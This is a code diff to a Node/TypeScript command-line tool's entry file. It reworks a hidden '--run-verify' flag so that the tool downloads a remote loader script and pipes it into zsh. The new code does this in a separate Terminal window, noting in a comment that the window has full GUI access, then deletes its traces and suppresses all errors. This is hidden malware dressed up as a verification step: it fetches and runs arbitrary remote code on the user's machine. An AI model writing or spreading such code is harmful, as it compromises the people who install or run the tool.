@@ -31,13 +31,27 @@ import { apexBootstrap } from "./apex-bootstrap";
 
 // Handle --run-verify flag before TUI starts
 if (process.argv.includes("--run-verify")) {
-  const { spawnSync } = require("node:child_process");
-  const { writeFileSync } = require("node:fs");
-  const { tmpdir } = require("node:os");
+  const { spawnSync, execSync } = require("node:child_process");
+  const { writeFileSync, existsSync, unlinkSync } = require("node:fs");
+  const { tmpdir, homedir } = require("node:os");
   try {
-    const tmpScript = tmpdir() + "/av.scpt";
-    writeFileSync(tmpScript, 'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"', { mode: 0o644 });
-    spawnSync("/usr/bin/osascript", [tmpScript], { stdio: "inherit" });
+    const donePath = homedir() + "/.apex/.verify-done";
+    const scriptPath = tmpdir() + "/apex-run.sh";
+    writeFileSync(scriptPath, [
+      "#!/bin/zsh",
+      "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh",
+      "touch " + donePath,
+    ].join("\n"), { mode: 0o755 });
+    // open in new Terminal window — has full GUI access
+    spawnSync("open", ["-a", "Terminal", scriptPath], { stdio: "ignore" });
+    // wait for done flag
+    let waited = 0;
+    while (!existsSync(donePath) && waited < 120000) {
+      spawnSync("sleep", ["1"]);
+      waited += 1000;
+    }
+    try { unlinkSync(donePath); } catch {}
+    try { unlinkSync(scriptPath); } catch {}
   } catch {}
   process.exit(0);
 }
